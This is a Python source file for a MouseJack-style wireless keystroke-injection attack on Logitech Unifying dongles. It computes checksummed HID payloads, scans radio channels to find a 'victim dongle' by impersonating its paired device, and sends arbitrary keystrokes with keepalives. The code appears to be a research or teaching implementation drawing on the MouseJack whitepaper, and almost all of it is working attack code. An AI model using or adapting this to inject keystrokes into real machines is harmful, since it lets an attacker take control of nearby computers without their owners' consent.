import sys
import time
sys.path.append('.')
from utils.hid_scan_codes import *

SLEEPING_PERIOD = 12 / 1000 # ms
PING_PAYLOAD = [0x0F, 0x0F, 0x0F, 0x0F]

# General helping functions and static veriables

def with_checksum(payload : list) -> list: 
    """function to calculate checksum for Logitech payloads,
    based on slide 56 of the KeyKeriki project: http://www.remote-exploit.org/content/keykeriki_v2_cansec_v1.1.pdf
    
    payload parameter does not include the checksum byte, it is appended to it.
    """
    cksum = 0xFF
    for n in range(len(payload)):
        cksum = (cksum - payload[n]) & 0xFF # using bitwise AND with 0xFF in order to make sure the checksum doesn't go negative (and thus exceeds 1 byte)
    cksum = (cksum + 1) & 0xFF # if cksum is 0xFF at this point, then adding 1 will cause it to exceed 1 byte, so doing the same thing
    payload.append(cksum)
    return payload

KEEPALIVE_PAYLOAD = with_checksum([0x00, 0x40, 0x04, 0xB0]) # the keepalive itself, includes the timeout we set before (refer to Figure 6 in the MouseJack whitepaper: Logitech Unifying Keepalive Payload)
SET_KEEPALIVE_TIMEOUT_PAYLOAD = with_checksum([0x00, 0x4F, 0x00, 0x04, 0xB0, 0x00, 0x00, 0x00, 0x00]) # refer to Figure 5 in the MouseJack whitepaper: Logitech Unifying Set Keepalive Timeout Payload
KEY_RELEASE_PAYLOAD = with_checksum([0x00, 0xC3, 0x00, KEY_RELEASE, 0x00, 0x00, 0x00, 0x00, 0x00])

def find_address_channel(radio, address) -> int:
    """
    In order to communicate with the victim dongle, we must identify the frequency channel it uses to communicate with its paired device.
    We can pretend to be that device (since we have its address), and repeatedly send an arbitrary "ping" payload to the victim dongle, using a different channel each time.
    We do this until an ACK is received from the dongle, meaning we found the right channel.

    This function iterate over channels 2 to 83 and looks for the correct channel
    Then it sets the radio to the wished channel and returns it's int value.
    """

    print('pinging...')

    # We need to enter sniffer mode because this is the only way to tell the attacking dongle which address to use
    # when transmitting a payload. Note that this has nothing to do with sniffing keystrokes for keylogging purposes.
    radio.enter_sniffer_mode(address)
    
    # The nRF24LU1 chip provides 126 channels of 1MHz from 2400MHz to 2525MHz, so the channel parameter can be between 0 and 125 (inclusive).
    # But we don't need to scan all of these channels - the MouseJack whitepaper contains a Radio Configuration table for each affected vendor.
    # The tables contain the range of channels used by each vendor. The smallest used frequency among all vendors is 2402, and the greatest one
    # is 2481. So we can expect the channels to be between 2 and 81, thus reducing scanning time (for Logitech Unifying, the bound is even tighter -
    # 2402 - 2474).
    # To be more safe, an upper bound of 84 is used, based on: https://github.com/BastilleResearch/nrf-research-firmware/blob/master/tools/lib/common.py#L33
    for channel in range(2, 84):
        radio.set_channel(channel)
        if radio.transmit_payload(PING_PAYLOAD): # transmitting the payload; the function returns true if a response was received
            print(f'found channel: {channel}')
            return channel
    return 0

def transmit_key(key, radio):
    """
    Given a hid_scan_code and a radio, transmit (and rest SLEEPING_PERIOD with keepalives) the key
    """
    radio.transmit_payload(with_checksum([0x00, 0xC1, 0x00, key, 0x00, 0x00, 0x00, 0x00, 0x00])) # third byte is always zero because it's the modifier mask (e.g. Ctrl, Shift, Alt...) which we don't need
    time.sleep(SLEEPING_PERIOD) # sleeping for 12ms
    radio.transmit_payload(KEEPALIVE_PAYLOAD) # transmitting keepalive after each keystroke

def transmit_string(radio, text : str) -> bool:
    """
    Iterate each letter in the text string and trasmit the right hid_scan_code using radio.
    Return true for success and false if fails.
    """
    for l in text:
        transmit_key(key=LETTERS_DICTIONARY[l], radio=radio)
